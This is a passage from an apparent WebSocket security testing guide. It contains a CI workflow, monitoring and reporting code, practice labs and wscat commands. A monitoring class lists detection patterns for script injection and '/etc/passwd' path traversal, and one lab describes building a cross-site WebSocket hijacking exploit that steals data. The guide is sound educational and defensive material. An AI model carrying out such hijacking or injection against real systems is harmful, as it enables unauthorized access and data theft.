- **Error Handling**: Not handling WebSocket errors properly
- **Timeout Issues**: Setting appropriate timeouts for testing
- **Connection Management**: Properly closing WebSocket connections
- **Resource Exhaustion**: Not cleaning up test connections
- **False Positives**: Misinterpreting normal WebSocket behavior
- **Incomplete Testing**: Not testing all message types

### Implementation Pitfalls
- **Missing Authentication**: Not requiring authentication for connections
- **Weak Session Management**: Using predictable session identifiers
- **No Input Validation**: Not validating message content
- **Missing Rate Limiting**: Not limiting connections/messages
- **Insecure Transport**: Using ws:// instead of wss://
- **Poor Error Handling**: Exposing internal information in errors
- **No Logging**: Not logging WebSocket activity
- **Hardcoded Secrets**: Embedding secrets in client code

## Integration Points

### CI/CD Integration
```yaml
# GitHub Actions workflow
name: WebSocket Security Testing
on: [push, pull_request]

jobs:
  websocket-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Install dependencies
        run: pip install -r requirements.txt
      - name: Run WebSocket tests
        run: python -m websocket_tester scan --config config.yaml
      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: websocket-results
          path: results/
```

### Monitoring Integration
```python
# Real-time WebSocket monitoring
import time
from datetime import datetime

class WebSocketMonitor:
    def __init__(self):
        self.connections = {}
        self.messages = []
        self.alerts = []
    
    def monitor_connection(self, url: str, user_id: str):
        """Monitor WebSocket connection"""
        if url not in self.connections:
            self.connections[url] = {}
        
        self.connections[url][user_id] = {
            'connected_at': datetime.now().isoformat(),
            'messages_sent': 0,
            'messages_received': 0
        }
    
    def monitor_message(self, url: str, user_id: str, 
                       message: str, direction: str):
        """Monitor WebSocket message"""
        message_data = {
            'url': url,
            'user_id': user_id,
            'message': message[:100],  # Truncate for storage
            'direction': direction,
            'timestamp': datetime.now().isoformat()
        }
        
        self.messages.append(message_data)
        
        # Check for suspicious activity
        if self._is_suspicious(message):
            self.send_alert(message_data)
    
    def _is_suspicious(self, message: str) -> bool:
        """Check if message is suspicious"""
        suspicious_patterns = [
            r'<script',
            r'javascript:',
            r'exec\(',
            r'eval\(',
            r'\.\./',
            r'etc/passwd',
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, message, re.IGNORECASE):
                return True
        
        return False
    
    def send_alert(self, message_data: Dict):
        """Send alert for suspicious activity"""
        alert = {
            'type': 'Suspicious WebSocket Activity',
            'details': message_data,
            'timestamp': datetime.now().isoformat()
        }
        self.alerts.append(alert)
```

### Reporting Integration
```python
class WebSocketReporter:
    def generate_report(self, test_results: List[Dict]) -> Dict:
        """Generate comprehensive WebSocket security report"""
        report = {
            'summary': {
                'total_tests': len(test_results),
                'vulnerabilities_found': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
            },
            'vulnerabilities': [],
            'recommendations': [],
            'generated_at': datetime.now().isoformat()
        }
        
        for result in test_results:
            if 'vulnerability' in result:
                report['vulnerabilities'].append(result)
                report['summary']['vulnerabilities_found'] += 1
                severity = result.get('severity', 'low')
                report['summary'][severity] += 1
        
        # Generate recommendations
        if report['summary']['critical'] > 0:
            report['recommendations'].append("IMMEDIATE: Fix critical WebSocket vulnerabilities")
        
        report['recommendations'].extend([
            "Implement authentication for all WebSocket connections",
            "Add origin validation to prevent CSWSH",
            "Use WSS for encrypted communication",
            "Implement rate limiting for connections and messages",
            "Validate and sanitize all WebSocket messages",
            "Add logging and monitoring for WebSocket activity",
            "Use cryptographically secure session identifiers"
        ])
        
        return report
```

## Practice Labs

### Lab 1: WebSocket Authentication Testing
Create a WebSocket authentication tester that:
1. Tests connections without authentication
2. Tests token validation
3. Identifies authentication bypass vulnerabilities
4. Generates proof-of-concept exploits

### Lab 2: Message Injection Testing
Build a message injection tester that:
1. Fuzzes WebSocket messages
2. Tests for SQL/NoSQL injection
3. Tests for XSS via messages
4. Documents injection vulnerabilities

### Lab 3: CSWSH Exploitation
Develop a CSWSH exploit that:
1. Tests origin validation
2. Hijacks WebSocket connections
3. Steals real-time data
4. Demonstrates impact

### Lab 4: Rate Limiting Testing
Create a rate limiting tester that:
1. Tests connection flooding
2. Tests message flooding
3. Identifies DoS vulnerabilities
4. Measures impact

### Lab 5: Comprehensive WebSocket Scanner
Build a complete WebSocket scanning suite that:
1. Integrates all testing components
2. Provides unified reporting
3. Supports automated testing
4. Offers dashboard visualization

## Ethics

### Responsible WebSocket Testing
- **Authorization**: Only test WebSocket endpoints with explicit permission
- **Scope Respect**: Stay within authorized testing boundaries
- **Rate Limiting**: Implement delays to avoid denial of service
- **Data Handling**: Treat all captured data as potentially sensitive
- **Impact Awareness**: Be aware of potential impact on production systems
- **Credential Security**: Don't log or expose credentials
- **Disclosure**: Report findings through responsible channels
- **Documentation**: Maintain audit trail of all testing activities
- **Privacy**: Handle personal data according to regulations
- **Cleanup**: Remove test data and artifacts after testing

## Quick Reference

### WebSocket Commands
```bash
# Connect to WebSocket
wscat -c ws://target.com/ws

# Connect with authentication
wscat -c ws://target.com/ws -H "Authorization: Bearer token"

# Send message
wscat -c ws://target.com/ws -x '{"type": "test"}'

# Listen for messages
wscat -c ws://target.com/ws -w 5
```

### Common WebSocket Vulnerabilities
1. **CSWSH**: Cross-Site WebSocket Hijacking
2. **Authentication Bypass**: Unauthenticated connections
3. **Message Injection**: SQL/NoSQL/XSS injection
4. **DoS**: Connection/message flooding
5. **Data Exposure**: Sensitive data in messages
6. **Missing Encryption**: Plaintext WebSocket

### Testing Checklist
- [ ] Test WebSocket handshake security
- [ ] Test authentication mechanisms
- [ ] Test authorization controls
- [ ] Test input validation
- [ ] Test rate limiting
- [ ] Test encryption (WSS)
- [ ] Test origin validation
- [ ] Test session management
- [ ] Test error handling
- [ ] Test logging and monitoring

### Troubleshooting Quick Fixes
1. **Connection refused**: Check WebSocket endpoint URL
2. **Handshake failed**: Verify upgrade headers
3. **Authentication errors**: Check token format
4. **Timeout issues**: Adjust timeout values
5. **Connection dropped**: Check for rate limiting
6. **Message errors**: Validate JSON format
7. **SSL errors**: Verify certificate validity
8. **Memory issues**: Clean up connections properly
